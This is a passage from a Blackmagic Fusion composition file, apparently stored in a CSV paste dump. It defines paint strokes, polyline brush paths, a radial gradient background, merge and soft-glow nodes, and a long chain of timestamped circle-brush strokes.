id,title,username,language,date,content
							{ Linear = true, X = -0.0895953757225433, Y = 0.0253445975989328, LX = -0.000327484965584994, LY = -0.0062249888839484, RX = 0.00192678227360308, RY = 0.00444642063139174 },
							{ Linear = true, X = -0.0838150289017341, Y = 0.038683859493108, LX = -0.00192678227360308, LY = -0.00444642063139174, RX = 0.00192678227360308, RY = 0.00281606639988145 },
							{ Linear = true, X = -0.0780346820809248, Y = 0.0471320586927524, LX = -0.00192678227360308, LY = -0.00281606639988145 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke21 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.043757292882147, Y = -0.0803441236512102, RX = -0.00583430571761961, RY = 0.0032012836051046 },
							{ Linear = true, X = -0.0612602100350059, Y = -0.0707402728358965, LX = 0.00583430571761961, LY = -0.0032012836051046, RX = -0.00422892455690908, RY = 0.00506181887832604 },
							{ Linear = true, X = -0.0739469837057331, Y = -0.0555548162009184, LX = 0.00422892455690908, LY = -0.00506181887832604, RX = -0.00262724658518423, RY = 0.00429538473379913 },
							{ Linear = true, X = -0.0818287234612858, Y = -0.042668661999521, LX = 0.00262724658518423, LY = -0.00429538473379913 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		Background1_3 = Background {
			NameSet = true,
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""MaskPaint2"",
					Source = ""Mask"",
				},
				ApplyMaskInverted = Input { Value = 1, },
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Gradient"" }, },
				TopLeftRed = Input { Value = 0.5, },
				TopLeftGreen = Input { Value = 0.5, },
				TopLeftBlue = Input { Value = 0.5, },
				GradientType = Input { Value = FuID { ""Radial"" }, },
				Start = Input { Value = { 0.5, 0.5 }, },
				End = Input { Value = { 0.914, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0.214521452145215] = { 0, 0, 0, 0 },
							[0.216312056737589] = { 0.988235294818878, 0.764705896377563, 0.533333361148834, 1 },
							[0.221782178217822] = { 0.988235294818878, 0.764705896377563, 0.533333361148834, 1 },
							[0.223648648648649] = { 0, 0, 0, 0 },
							[0.256448047162859] = { 0, 0, 0, 0 },
							[0.259395725865881] = { 1, 1, 1, 1 },
							[0.263080324244657] = { 1, 1, 1, 1 },
							[0.266028002947679] = { 0, 0, 0, 0 },
							[0.305498981670061] = { 0, 0, 0, 0 },
							[0.306517311608961] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.312627291242363] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.314876584389593] = { 0, 0, 0, 0 },
							[0.473755964553511] = { 0, 0, 0, 0 },
							[0.476942514213519] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.483299250170416] = { 1, 0.879169827586207, 0.7541, 1 },
							[0.485344239945467] = { 0, 0, 0, 0 },
							[0.596904937361828] = { 0, 0, 0, 0 },
							[0.600589535740604] = { 1, 1, 1, 1 },
							[0.605747973470892] = { 1, 1, 1, 1 },
							[0.608695652173913] = { 0, 0, 0, 0 },
							[0.783345615327929] = { 0, 0, 0, 0 },
							[0.787030213706706] = { 1, 1, 1, 1 },
							[0.792925571112749] = { 1, 1, 1, 1 },
							[0.796610169491525] = { 0, 0, 0, 0 },
							[0.987472365512159] = { 0, 0, 0, 0 },
							[0.990420044215181] = { 1, 1, 1, 1 },
							[0.995578481945468] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 0 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5335, 445.5 } },
		},
		Merge4_1 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background1_3"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""SoftGlow1_2_2"",
					Source = ""Output"",
				},
				Angle = Input {
					Value = -7.9,
					Expression = ""-time*0.1"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 445.5 } },
		},
		SoftGlow1_2_1_1 = SoftGlow {
			Inputs = {
				Blend = Input { Value = 0.5, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				Threshold = Input { Value = 0.606, },
				Gain = Input { Value = 1.25, },
				XGlowSize = Input { Value = 23.9, },
				ClippingMode = Input { Value = FuID { ""Domain"" }, },
				ColorScale = Input { Value = 1, },
				RedScale = Input { Value = 1.4, },
				BlueScale = Input { Value = 0.6, },
				Input = Input {
					SourceOp = ""Merge4_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 511.5 } },
		},
		Paint1 = Paint {
			Inputs = {
				Input = Input {
					SourceOp = ""SoftGlow1_2_1_1"",
					Source = ""Output"",
				},
				Paint = Input {
					SourceOp = ""Stroke153"",
					Source = ""Out"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 577.5 } },
		},
		Stroke153 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379033940 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke152"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.983261108398438, 0.320204794406891 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke152 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379031450 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke151"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.983654975891113, 0.270578980445862 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke151 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379026185 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke150"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.849744021892548, 0.305238276720047 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke150 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379024145 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke149"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.652028381824493, 0.211500585079193 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke149 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379021924 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke148"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.653997659683228, 0.239070504903793 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke148 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379019510 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke147"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.676053583621979, 0.248916894197464 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke147 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379017830 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke146"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.616187453269958, 0.269397407770157 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke146 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379016150 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke145"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.656754612922668, 0.29814887046814 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke145 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379013735 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke144"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.586648285388947, 0.315084666013718 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke144 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379011590 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke143"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.562623083591461, 0.306025981903076 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke143 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379009745 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke142"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.595313131809235, 0.270972818136215 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke142 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379007750 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke141"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.597282409667969, 0.249310746788979 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke141 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379005695 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke140"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.596888542175293, 0.229224100708961 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke140 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379003505 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke139"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.543324172496796, 0.218983858823776 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke139 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379001765 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke138"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.492122888565063, 0.206774324178696 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke138 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378998554 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke137"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.506695568561554, 0.230011820793152 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke137 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378996875 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke136"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.499606132507324, 0.235919654369354 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke136 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378995149 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke135"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.532296180725098, 0.272548258304596 }, },
